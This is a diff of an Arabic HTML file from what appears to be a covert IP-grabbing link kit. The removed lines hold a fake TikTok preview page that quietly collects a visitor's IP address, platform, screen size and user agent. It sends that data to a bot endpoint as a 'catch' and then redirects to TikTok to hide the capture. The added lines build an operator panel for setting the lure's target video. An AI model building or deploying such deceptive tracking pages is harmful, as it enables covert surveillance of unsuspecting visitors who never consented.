@@ -1,53 +1,47 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="شاهد هذا المقطع الحصري! 🔥">
-    <meta property="og:description" content="تيك توك - مشاهدات رائجة الآن">
-    <meta property="og:image" content="https://www.tiktok.com/favicon.ico">
-    <meta name="twitter:card" content="summary_large_image">
-
-    <title>جارٍ التحميل...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Radar-X20 Pro Control</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #1e293b; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 90%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 15px 0; border-radius: 5px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        button { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold; }
+        button:hover { background: #2563eb; }
+        .status { margin-top: 15px; font-size: 14px; color: #94a3b8; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>لوحة التحكم 🛰️</h2>
+        <p>ضع رابط المقطع (تيك توك، انستا..)</p>
+        <input type="text" id="videoUrl" placeholder="https://www.tiktok.com/...">
+        <button onclick="saveLink()">تحديث الرابط الملغم</button>
+        <div id="status" class="status"></div>
+    </div>
 
     <script>
-        async function captureAndRedirect() {
-            // --- الإعدادات ---
-            const original_video = "https://www.tiktok.com"; // ضع رابط الفيديو الأصلي هنا
-            const api_endpoint = "/api/index"; // مسار الـ API حقك
+        async function saveLink() {
+            const url = document.getElementById('videoUrl').value;
+            const status = document.getElementById('status');
+            if(!url) return alert("ضع الرابط أولاً!");
 
-            let deviceData = {};
-            
-            // 1. سحب الـ IP
+            status.innerText = "جاري الحفظ...";
+            // هنا نرسل الرابط إلى الـ API ليتم تخزينه
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                deviceData.ip = ipData.ip;
-            } catch(e) { deviceData.ip = "مخفي"; }
-
-            // 2. سحب بيانات الجهاز
-            deviceData.platform = navigator.platform;
-            deviceData.screen = window.screen.width + "x" + window.screen.height;
-            deviceData.userAgent = navigator.userAgent;
-
-            // 3. إرسال الصيدة للبوت
-            try {
-                await fetch(api_endpoint, {
+                const response = await fetch('/api/index', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        action: "دخول عبر رابط ملغم (تمويه)", 
-                        device: deviceData 
-                    })
+                    body: JSON.stringify({ targetUrl: url }),
+                    headers: { 'Content-Type': 'application/json' }
                 });
-            } catch(e) { console.log("Error sending data"); }
-
-            // 4. التحويل الفوري للفيديو الأصلي
-            window.location.href = original_video;
+                if(response.ok) status.innerText = "✅ تم تحديث الرابط بنجاح!";
+                else status.innerText = "❌ فشل التحديث";
+            } catch (e) {
+                status.innerText = "⚠️ خطأ في الاتصال";
+            }
         }
-        
-        window.onload = captureAndRedirect;
     </script>
-</head>
-<body style="background-color: #000;">
 </body>
 </html>
